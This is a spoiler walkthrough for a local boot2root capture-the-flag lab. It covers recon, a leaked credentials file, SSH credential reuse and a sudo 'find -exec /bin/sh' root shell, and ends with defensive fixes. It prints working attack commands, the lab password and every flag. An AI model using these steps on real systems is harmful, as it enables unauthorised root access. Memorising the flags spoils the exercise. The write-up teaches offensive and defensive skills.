# 🛰️ Sentry — SOLUTION (spoilers)

> Full walkthrough. Don't read this unless you're really stuck or reviewing.

Boot2root kill chain: **recon → web info-disclosure → SSH credential reuse →
sudo/GTFOBins priv-esc.** Three flags.

Target: `localhost`, web on **8082**, SSH on **2222**.

---

## Stage 0 — Recon (nmap)

```bash
nmap -sV -p- localhost           # find everything
# or, knowing the published ports:
nmap -sV -p 2222,8082 localhost
```

Two services of interest:

- `2222/tcp` — **OpenSSH** (foothold candidate)
- `8082/tcp` — **HTTP**, Werkzeug/Flask (Python)

Takeaway: an SSH port + a web port is the most common boot2root shape. The web app
usually hands you the SSH creds.

---

## Stage 1 — Web enumeration → Flag 1 (recon)

The homepage is a plain corporate page, but it mentions internal staging/deploy
tooling. Enumerate:

```bash
curl -s localhost:8082/robots.txt
# User-agent: *
# Disallow: /backups/
```

`robots.txt` "hides" `/backups/` — which of course means look there. (gobuster finds
it too: `gobuster dir -u http://localhost:8082 -w ~/tools/SecLists/Discovery/Web-Content/common.txt`.)

```bash
curl -s localhost:8082/backups/
# directory listing -> dev_credentials.txt
curl -s localhost:8082/backups/dev_credentials.txt
```

That file contains:

- **Flag 1:** `FLAG{recon_expos3d_backup_cr3ds}`
- The foothold creds: **`dev : Sup3rD3vPass!2026`**

Lesson: information disclosure isn't glamorous, but exposed backups/notes/configs
are how a huge fraction of real boxes fall. robots.txt is a signpost, not a lock.

---

## Stage 2 — Foothold over SSH → Flag 2 (user.txt)

Credential reuse: the web-leaked dev password is also the SSH password.

```bash
ssh dev@localhost -p 2222
# password: Sup3rD3vPass!2026
cat ~/user.txt
```

- **Flag 2:** `FLAG{f00thold_ssh_cr3d_r3us3}`

(Direct root SSH is disabled — `PermitRootLogin no` — so root must be *earned*.)

---

## Stage 3 — Privilege escalation → Flag 3 (root.txt)

First thing after landing any shell: enumerate local privileges.

```bash
id
sudo -l
```

`sudo -l` reveals the misconfiguration:

```
User dev may run the following commands on sentry:
    (root) NOPASSWD: /usr/bin/find
```

`dev` can run **find as root without a password**. `find` is a
[GTFOBins](https://gtfobins.github.io/gtfobins/find/) classic — its `-exec` runs an
arbitrary command, and since sudo runs it as root, that command runs as root:

```bash
sudo find . -exec /bin/sh \; -quit
# now root:
id            # uid=0(root)
cat /root/root.txt
```

- **Flag 3:** `FLAG{r00t_sudo_find_gtf0b1ns}`

(`/root/root.txt` is mode 600, root-only — you cannot read it as `dev`; the priv-esc
is mandatory.)

Alternate GTFOBins-find root shells that also work:
`sudo find . -exec /bin/bash -p \; -quit`

---

## Fixes (the blue-team half)

- **Don't leak secrets on the web.** No backups/notes/configs on a public vhost;
  `robots.txt` is not access control. Rotate any credential that ever touched a repo
  or a webroot.
- **No shared accounts; enforce SSH keys** and disable password auth.
- **Least privilege in sudo.** `NOPASSWD` on a binary that can spawn a shell (find,
  vim, less, awk, env, …) is equivalent to giving away root. Grant specific,
  non-shell-capable commands only, and audit against GTFOBins.

## Flag summary

| # | Stage | Flag |
|---|-------|------|
| 1 | Recon / web info-disclosure | `FLAG{recon_expos3d_backup_cr3ds}` |
| 2 | Foothold (user.txt) | `FLAG{f00thold_ssh_cr3d_r3us3}` |
| 3 | Priv-esc (root.txt) | `FLAG{r00t_sudo_find_gtf0b1ns}` |
